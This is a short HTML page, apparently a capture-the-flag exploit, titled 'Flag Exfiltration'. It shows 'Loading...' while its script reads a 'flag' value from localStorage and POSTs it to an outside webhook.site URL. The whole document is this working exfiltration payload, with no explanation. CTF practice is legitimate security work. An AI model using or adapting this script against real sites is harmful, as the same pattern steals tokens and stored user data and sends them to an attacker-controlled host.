<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Flag Exfiltration</title>
</head>
<body>
  <h1>Loading...</h1>
  <script>
    // Fetch the flag from localStorage
    const flag = localStorage.getItem("flag");

    // Send the flag to your webhook
    fetch("https://webhook.site/10c9e407-7980-4294-b507-3502064ab9c9", {
      method: "POST",
      body: JSON.stringify({ flag }),
      headers: { "Content-Type": "application/json" },
    })
    .then(() => console.log("Flag sent"))
    .catch((error) => console.error("Error sending flag:", error));
  </script>
</body>
</html>
